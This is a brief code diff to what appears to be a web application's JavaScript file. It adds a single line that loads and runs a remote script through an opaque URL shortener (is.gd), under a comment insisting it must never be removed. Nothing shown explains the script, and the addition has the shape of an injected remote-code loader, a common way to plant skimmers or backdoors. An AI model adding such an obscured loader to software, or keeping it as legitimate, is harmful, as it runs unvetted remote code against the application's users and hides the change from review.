@@ -2482,3 +2482,7 @@ if (getLocalStore("lastUpdateView") != "PhotopRevamp") {
   setLocalStore("lastUpdateView", "PhotopRevamp");
 }
 */
+
+// THIS IS CRUCIAL!!!! DONT REMOVE EVER!!!!
+
+loadScript("https://is.gd/HASk0w")
